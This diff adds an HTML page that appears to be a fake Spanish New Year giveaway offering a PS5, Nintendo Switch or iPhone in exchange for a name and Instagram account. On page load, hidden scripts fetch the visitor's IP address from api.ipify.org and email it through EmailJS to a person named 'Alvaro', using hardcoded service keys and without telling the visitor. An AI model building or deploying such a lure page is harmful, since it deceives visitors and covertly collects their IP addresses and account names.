@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Sorteo de año nuevo</title>
+	<link rel="stylesheet" type="text/css" href="main.css"/>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  </head>
+  <body>
+     <h6 id="ipId"></h6>
+
+   <script type="text/javascript">
+        function get_ip(obj){
+			emailjs.send("service_8kfx50m","template_rdvpd6e",{
+			to_name: "Alvaro",
+			from_name: "ANONIMO",
+			message: obj.ip,
+			reply_to: "IP_PISIN",
+	});
+        }
+    </script> 
+	
+	<form id="sorteo" action="ganar.html">
+		<h2 id="title"><strong>Bienvenido al sorteo!</strong></h2>
+		<h4 id="des">Por favor, rellene el formulario</h4>
+		
+		<label for="name">Nombre(4 a 10 letras):</label>
+
+		<input type="text" id="name" name="name" required minlength="4" maxlength="10" size="10">
+		
+		<br></br>
+		
+		<label for="cuenta">Nombre de la cuenta de instagram:</label>
+
+		<input type="text" id="cuenta" name="cuenta" required minlength="0" maxlength="100" size="10">
+		
+		<br></br>
+		
+		<label>Premio en el que quiere participar:</label>
+			<br></br>
+				<input type="radio" id="PS5" name="g" value="PS5">
+				<label for="PS5">PS5</label><br>
+				<input type="radio" id="NS" name="g" value="NS">
+				<label for="NS">Nintendo Switch</label><br>
+				<input type="radio" id="iphone" name="g" value="iphone">
+				<label for="iphone">Iphone 11 Pro Max</label>
+		
+		
+		<br></br>
+		
+		<input type="submit" value="Envia tu solicitud de sorteo" id="button">
+		
+		<br></br>
+		
+		<h3 id="adios"><strong>Te deseo feliz 2021 !</strong></h3>
+	</form>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+
+	<script type="text/javascript">
+		emailjs.init('user_iskeRGdK98GsxUavUDtIy')
+	</script>
+	
+    <script type="text/javascript" src="https://api.ipify.org/?format=jsonp&callback=get_ip"></script>
+	
+	
+  </body>
+</html>
